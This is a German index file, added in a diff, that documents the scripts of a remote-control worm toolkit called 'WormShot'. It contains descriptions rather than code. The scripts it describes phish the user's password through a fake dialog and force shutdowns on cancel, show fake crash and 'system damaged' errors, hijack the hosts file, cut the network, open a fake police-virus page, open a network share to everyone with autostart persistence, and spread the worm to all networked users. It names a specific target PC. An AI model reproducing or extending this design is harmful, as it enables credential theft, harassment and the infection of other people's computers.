@@ -1,0 +1,89 @@
+******************************************************** Ordner INDEX ********************************************************
+## 0_GetTasklist.bat ## = ausführbare Datei
+Alle aktiven Prozesse werden in eine eigene Textdatei (.wsdt) unter "\SYS\CollectedData\Task-Cache\" gespeichert. 
+
+## 0_HostsBlock_Off.bat ## = ausführbare Datei
+Die manipulierte Hosts-Datei wird durch das BackUp aus "\SYS\CollectedData\BackUp\hosts" mit der Standard-Hosts Datei ersetzt. 
+
+## 0_HostsBlock_On.bat ## = ausführbare Datei
+Selbst frei-wählbare Homepages können blockiert werden. Diese Manipulation ist nur durch HostsBlock_Off.bat rückgängig zu machen. 
+
+## 0_InputBox_Password_SAVE.vbs ## = ausführbare Datei
+In einem Dialogfeld (InputBox) wird nach dem Benutzer Passwort gefragt. Wird etwas eingegeben und auf 'OK' geklickt, wird das 
+Passwort in "\SYS\CollectedData\Password.wsdt" gespeichert. Wird auf 'Abbrechen' oder das Schließen-Kreuz geklickt, wird ein 
+Dialogfeld mit 'Betriebssystem beschädigt' angezeigt und der PC wird schlagartig heruntergefahren. 
+
+## 0_Internet_OFF.bat ## = ausführbare Datei
+Über 'ipconfig /release' wird die IP-Adresse zurückgegeben, wodurch die Netzwerkverbindung und Internetverbindung abbricht. 
+Bitte beachte, dass keine NEUEN Befehle gegeben werden können, da WormShot über die Netzwerkverbindung arbeitet. Es kann
+jedoch über die Funktion 'Schedule' im Kontrollpanel der Zeitpunkt angegeben werden, wann die Netzwerkverbindung (Internet_On.bat)
+aktiviert (ausgeführt) werden soll. 
+
+## 0_Internet_ON.bat ## = ausführbare Datei
+Über 'ipconfig /renew' wird die Netzwerk-/ und Internetverbindung wiederhergestellt. 
+
+## 0_MinimizeAll.vbs ## = ausführbare Datei
+Alle Vordergrund-Anwendungen werden minimiert. 
+
+## 0_Msg-ChromeBroken_ON.vbs ## = ausführbare Datei
+Als Erstes wird Google Chrome beendet. Folgend popt ein Dialogfeld auf: 'Chrome abgestürtzt. Neustarten?' Wird auf 'Wiederholen'
+geklickt, wird "www.killwithus.com" geöffnet, wird auf 'Abbrechen' wird per 'ipconfig /release' die Netzwerkverbindung getrennt. 
+Wird auf 'Ignorieren' geklickt, passiert Nichts. Wird das Dialogfeld 2 Minuten ignoriert, dann wird der PC in 30 Sekunden 
+heruntergefahren. Das Rote Kreuz ist deaktiviert. 
+
+## 0_Msg-ErrorShutdown_ON.vbs ## = ausführbare Datei
+Dialogfeld popt auf: 'Registry Error 45x134, Restart recommended'. Wird 2 Minuten lang nicht geantwortet, fährt der PC in 10s 
+herunter. Auf 'OK' wird er PC sofort heruntergefahren und auf 'Abbrechen' wird die Anwendung 'explorer.exe' beendet. Beim
+Roten Kreuz passiert Nichts. 
+
+## 0_MsgLOOP_Damage.vbs ## = ausführbare Datei
+Dialogfeld mit 'Betriebssystem beschädigt' popt beim Schließen bzw. bestätigen einer Auswahl in Endlosschleife auf. 
+
+## 0_PolizeiHP.bat ## = ausführbare Datei
+Intranet-Zugriff: "\SYS\Intranet\Polizei\Polizei.html" wird geöffnet. Ähnelt einem Polizei-Virus. Da in der Adresszeile unvermeidbar
+der Pfad zur HTML-Datei sichtbar ist, sollte dieser Befehl wenn überhaupt nur auf Celinas-PC ausgeführt werden. 
+
+## 0_RemoteReInstall.bat ## = ausführbare Datei
+Es wird die Netzwerkressource "WindowsRecovery$" mit vollen Rechten für Jedermann freigegeben und die AutoStart-Datei Start.lnk
+wird in den StartUp-Ordner kopiert. 
+
+## 0_ShareWormShot.bat ## = ausführbare Datei
+WormShot wird auf alle verfügbaren Netzwerkcomputer, auf jeweils jeden einzelnen Benutzer, installiert. Danach sollte für eine
+uneingeschränkte Berechtigung auch 'RemoteReInstall.bat' ausgeführt werden. Nach einer Neu-Infizierung wird der PC mit den 
+infizierten Usern in eine eigene .WSDT-Datei unter "\SYS\CollectedData\WormShare\" gespeichert. 
+
+## 0_Shutdown_OFF.bat ## = ausführbare Datei
+Ein aktivierter "Shutdown.exe" wird abgebrochen. 
+
+## 0_Shutdown_ON.bat ## = ausführbare Datei
+Der PC wird sofort heruntergefahren. 
+
+## 0_SoundOff.vbs ## = ausführbare Datei
+Die Gesamt-Lautstärke wird auf 0 % gestellt. 
+
+## 0_SoundOn.vbs ## = ausführbare Datei
+Die Gesamt-Lautstärke wird auf 100 % gestellt. 
+
+## 0_WormShot_OFF.bat ## = ausführbare Datei
+WormShot wird per "taskkill /f /im cmd.exe /t" beendet. 
+
+## 0_WormShot_ON.bat ## = ausführbare Datei
+WormShot wird vom Standby-Modus aufgeweckt. Folgend werden wieder Befehle entgegengenommen. 
+
+## 0_WormShot_Standby.bat ## = ausführbare Datei
+WormShot wird in den StandBy-Modus versetzt. Kurz: Wormshot wird pausiert. Es werden keine Befehle angenommen. 
+
+## 0__Slot-1.bat ## = ausführbare Datei
+Kann jedes Mal eigens angepasst werden. 
+
+## 0__Slot-2.bat ## = ausführbare Datei
+Kann jedes Mal eigens angepasst werden. 
+
+## 0__Slot-3.vbs ## = ausführbare Datei
+Kann jedes Mal eigens angepasst werden. 
+
+## X_TestPING.wsdt ## = SYSTEM Datei
+Diese System-Datei wird vom SmartSpeed Pro-Kontrollpanel benötigt. Mit dieser WSDT-Datei wird der Empfang zum Ziel-PC getestet. 
+
+## __INDEX.txt ## = SYSTEM Datei
+Dieses auflistende Dokument.
